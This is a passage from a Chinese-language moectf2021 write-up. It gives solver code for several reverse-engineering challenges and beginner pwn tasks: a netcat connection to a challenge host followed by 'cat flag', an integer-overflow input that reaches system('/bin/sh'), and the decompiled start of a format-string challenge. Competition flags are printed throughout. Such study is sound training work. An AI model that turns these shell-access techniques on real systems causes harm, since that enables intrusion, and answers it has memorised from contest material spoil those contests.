class="line">??鎒qiersill摉ke羙u!reve2ierwilllikeyou!reverierwilllikeyou!騟ve|v遼w輊</span><br></pre></td></tr></table></figure><p>原来PE文件有很多相连的0字符, 这些地方异或以后会出现循环的密码字串, 盲猜一手密码是reverierwilllikeyou! 稍微修改下代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, code);</span><br><span class="line">    <span class="keyword">size_t</span> sl = <span class="built_in">strlen</span>(code);</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;rb&quot;</span>), *g = fopen(<span class="string">&quot;out&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fseek(f, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> len = ftell(f), i;</span><br><span class="line">    rewind(f);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        putc((~getc(f) ^ code[i % sl]), g);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f); fclose(g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入那个密码, 再用记事本打开, 看到了久违的MZ头.<br>修改后缀为exe, 得到flag.</p><blockquote><p>moectf{P3_Structur3_1s_r3ally_fUnnY!}</p></blockquote><h3 id="RedC4Bomb"><a href="#RedC4Bomb" class="headerlink" title="RedC4Bomb"></a>RedC4Bomb</h3><p>打开分析, 发现main函数直接JUMPOUT, 切汇编看看发生甚么事了.<br>找到JUMPOUT的地方, 发现加了花指令, 填nop还原一下. 诶, 又有一个, 再还原…<br>搞了老半天, 可能有什么脚本能快一点吧, IDA更多的不懂了.<br>总之有两个函数加了花指令, 都还原以后, 查看程序逻辑(有些函数名已修改):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-1E8h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+0h] [ebp-1E8h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+0h] [ebp-1E8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+D0h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">66</span>]; <span class="comment">// [esp+DCh] [ebp-10Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Welcome to moectf2021!\n&quot;</span>, v4);</span><br><span class="line">  sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Input your flag to dismantle the bomb: &quot;</span>, v5);</span><br><span class="line">  RC_JunkF();                                   <span class="comment">// 垃圾代码</span></span><br><span class="line">  sub_41403C(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">char</span>)&amp;unk_43D138);</span><br><span class="line">  RC_JunkF();</span><br><span class="line">  RC_Zero(v8, <span class="number">0x104</span>u);</span><br><span class="line">  RC_SetCode(v8);</span><br><span class="line">  RC_JunkF();</span><br><span class="line">  RC_InitBox((<span class="keyword">char</span> *)v8[<span class="number">64</span>], (<span class="keyword">int</span>)v8);</span><br><span class="line">  RC_Encoding((<span class="keyword">int</span>)v8, (<span class="keyword">int</span>)&amp;unk_43D138, (<span class="keyword">int</span>)byte_43D520);</span><br><span class="line">  RC_JunkF();</span><br><span class="line">  <span class="keyword">if</span> ( sub_4143DE((<span class="keyword">int</span>)&amp;unk_43D138) == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    RC_JunkF();</span><br><span class="line">    RC_JunkF();</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_43D520[i] != byte_43AB30[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4140E1(<span class="string">&quot;[root@Track.Sh]# NoNoNo! The bomb will go off!\n&quot;</span>, v6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RC_JunkF();</span><br><span class="line">    sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Right! The bomb was successfully disassembled~\n&quot;</span>, v6);</span><br><span class="line">    sub_4140E1(<span class="string">&quot;[root@Track.Sh]# The flag is moectf&#123;%s&#125;\n&quot;</span>, (<span class="keyword">char</span>)&amp;unk_43D138);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Wrong length! The bomb will go off!\n&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较像RC4, 但不完全是, 我用THISISAFAKEFLAG作为密码试了一下, 发现不行.<br>v8应该是一个C++类, 前256字节放sbox, 紧跟着是密码字符串, 先初始化sbox, 再加密用户输入, 然后和byte_43AB30比对.</p><p>碰一下运气吧, 猜它是对称加密, 写了如下代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint8_t</span> u8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4</span><span class="params">(<span class="keyword">const</span> u8 *in, u8 *out, <span class="keyword">size_t</span> len, <span class="keyword">const</span> u8 *key, <span class="keyword">size_t</span> keylen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    u8 S[<span class="number">256</span>], T[<span class="number">256</span>], b, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">        T[i] = (u8)key[i % keylen];</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        j = (j + S[i] + T[i]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        b = S[i]; S[i] = S[j]; S[j] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    j = k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        j++; k = k + S[j];</span><br><span class="line">        b = S[j]; S[j] = S[k]; S[k] = b;</span><br><span class="line">        out[i] = in[i] ^ S[(u8)(S[j] + S[k])];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4f</span><span class="params">(<span class="keyword">const</span> u8 *in, u8 *out, <span class="keyword">size_t</span> len, <span class="keyword">const</span> u8 *key, <span class="keyword">size_t</span> keylen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    u8 S[<span class="number">256</span>], T[<span class="number">256</span>], b, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        S[i] = <span class="number">0</span>;</span><br><span class="line">        T[i] = (u8)key[i % keylen];</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        S[i] = <span class="number">-1</span> - i;</span><br><span class="line">        j = (j + S[i] + T[i]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        b = S[i]; S[i] = S[j]; S[j] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    j = k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        j++; k = k + S[j];</span><br><span class="line">        b = S[j]; S[j] = S[k]; S[k] = b;</span><br><span class="line">        out[i] = in[i] ^ S[(u8)(S[j] + S[k])];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> key[] = <span class="string">&quot;THISISAFAKEFLAG&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> u8 m[] = &#123;</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x3F</span>, <span class="number">0x53</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0x3E</span>, <span class="number">0xAE</span>, <span class="number">0x55</span>, <span class="number">0xBE</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0xF2</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    u8 buf[<span class="number">21</span>];</span><br><span class="line">    buf[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">    rc4f(m, buf, <span class="number">20</span>, (<span class="keyword">const</span> u8 *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下, 得到”D1S4ss3mbl3_th3_b0mb”, 这应该就是我们要的答案了, 试一下, 果然可以.</p><blockquote><p>moectf{D1S4ss3mbl3_th3_b0mb}</p></blockquote><h3 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h3><p>这 都 是 些 啥 啊<br>我不到啊! 像某种汇编指令, 注意到文件中出现了这些东西:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">llvm.module.flags</span><br><span class="line">clang version 6.0.0-1ubuntu2</span><br></pre></td></tr></table></figure><p>在网上查询得知, 这是llvm的代码, 由clang编译得来. 这个原来的后缀应该是.ll, 从SegmentFault网上找到了编译它的方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">llvm-as chall.ll</span><br><span class="line">llc chall.bc</span><br><span class="line">clang chall.s</span><br></pre></td></tr></table></figure><p>结果找不到<code>__isoc99_scanf</code>. 额, 强行换成<code>scanf</code>, 这下可以了.<br>IDA载入, 那两个显眼的<del>下北沢</del>函数是RC4. 下面那个像base64(不完全是). 先把比对结果转成base64:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> key[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(buf), i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        buf[i] = key[buf[i] - <span class="number">61</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用工具进行base64解码, 再用程序中的”11 45 14 61 76 61 6C 6F 6E 2C 79 79 64 73”作为密钥进行RC4, 得到答案.</p><blockquote><p>moectf{Y0u_Kn0w_1lVm_ir_c0d3_A_l0t_!1!1}</p></blockquote><h3 id="Algorithm-revenge"><a href="#Algorithm-revenge" class="headerlink" title="Algorithm_revenge"></a>Algorithm_revenge</h3><p>又是个算法题. 载入后发现程序用一个固定的种子向一个二维数组填入随机数. 程序意图为:</p><blockquote><p>小人从(1, 1)出发, 可以选择(2, 1)或(2, 2)<br>小人在(n, m)时, 可以在下一步跳到(n + 1, m + i), (i = -1, 0, 1 且 m + i &gt; 0).<br>直到 n = 50 时停止. 计算小人经过的数的总和. 求和的最大值.</p></blockquote><p>我的算法是倒推法, 简单说就是从第 n 层去选一个 n + 1 层中最好的结果.如图所示:</p><p><img src="/pictures/moectf_algorithm_demo.svg" alt="算法"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">2499</span>], tree[<span class="number">2499</span>], path[<span class="number">49</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_buffer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j; srand(<span class="number">0x1BF52</span>u);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++) <span class="built_in">map</span>[<span class="number">50</span> * i + j] = rand() % <span class="number">1919810</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, m, n, s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">48</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> l = j - <span class="number">1</span>, r = j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (l &lt; <span class="number">0</span>) l = <span class="number">0</span>;</span><br><span class="line">            m = INT_MIN;</span><br><span class="line">            s = <span class="built_in">map</span>[<span class="number">50</span> * i + j];</span><br><span class="line">            <span class="keyword">for</span> (k = l; k &lt;= r; k++)&#123;</span><br><span class="line">                n = <span class="built_in">map</span>[<span class="number">50</span> * (i + <span class="number">1</span>) + k];</span><br><span class="line">                <span class="keyword">if</span> (n &gt; m)&#123;</span><br><span class="line">                    m = n;</span><br><span class="line">                    <span class="built_in">map</span>[<span class="number">50</span> * i + j] = m + s;</span><br><span class="line">                    tree[<span class="number">50</span> * i + j] = k - j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> tab[] = &#123;<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;R&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>, s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">49</span>; i++)&#123;</span><br><span class="line">        s = tree[i * <span class="number">50</span> + p];</span><br><span class="line">        <span class="built_in">putchar</span>(tab[s + <span class="number">1</span>]);</span><br><span class="line">        p += s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    init_buffer();</span><br><span class="line">    solve();</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;moectf&#123;&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">    disp();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真就acm了呗.</p><blockquote><p>moectf{DDDRDDLRLRDRDRLLRRRDLLLRRLDRRDRRLDDDLDRRDLRDLLRDD}</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>之前打比赛的时候完全不知道题目什么意思, 网站打开是一个个人博客, 然后啥也没有啊?<br>比赛结束才想起去网上搜一搜nc是啥, 然后发现是一个命令, 安装了个amd64的linux试了一下, 诶可以了.</p><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>linux下输入<code>nc pwn.blackbird.wang 9500</code>, 然后<code>cat flag</code></p><blockquote><p>moectf{enjoy_the_netcat_and_the_shell}</p></blockquote><h3 id="Int-overflow"><a href="#Int-overflow" class="headerlink" title="Int_overflow"></a>Int_overflow</h3><p>IDA打开分析:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you no integer overflow?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input an int ( &lt;0 )&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&lt;0 ?&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;But I want &lt;0 now!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You know int overflow!&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&gt;0 ?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按看到的那样, 随便给一个无符号整数2147483648(0x80000000)即可. <span style="color: #CCC;">用过修改器的同学应该对这个数字很熟悉hhh</span></p><blockquote><p>moectf{y0ul0v3m3m3l0v3y0u_1nt0v3rfl0w}</p></blockquote><h3 id="baby-fmt"><a href="#baby-fmt" class="headerlink" title="baby_fmt"></a>baby_fmt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;a1;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">  <span 